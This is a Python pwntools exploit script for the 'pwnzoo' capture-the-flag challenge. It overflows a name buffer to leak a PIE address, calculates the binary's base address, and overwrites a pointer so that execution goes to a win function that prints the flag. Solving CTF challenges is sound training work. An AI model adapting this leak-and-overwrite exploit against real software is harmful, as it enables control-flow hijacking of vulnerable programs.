#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['kitty', '-e', 'sh', '-c']
exe = context.binary = ELF('./chall')

host = args.HOST or 'pwnzoo-7fb58ad8.challenges.bsidessf.net'
port = int(args.PORT or 1234)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *main
b *print_flag
continue
'''.format(**locals())

io = start()
padding = "A" * 36

io.sendlineafter("Play as cat or dog? ", "cat")
io.sendlineafter("New name: ", padding + "BBBBBBBB")
io.recv()
io.sendline("1")
io.recvuntil(padding)
pie_leak = u64(io.recvn(6).ljust(8, '\x00')) # our name is printed out and we get a PIE leak
print(hex(pie_leak))

exe.address = pie_leak - 0x210
print(hex(exe.address))

io.recv()
io.sendline("2")
io.sendlineafter("New name: ", padding + p64(exe.address + 0x23b)) # win function
# io.sendlineafter("New name: ", padding + p64(0xdeadbeef))
io.recv()
io.sendline("1")
print(io.recv())
io.interactive()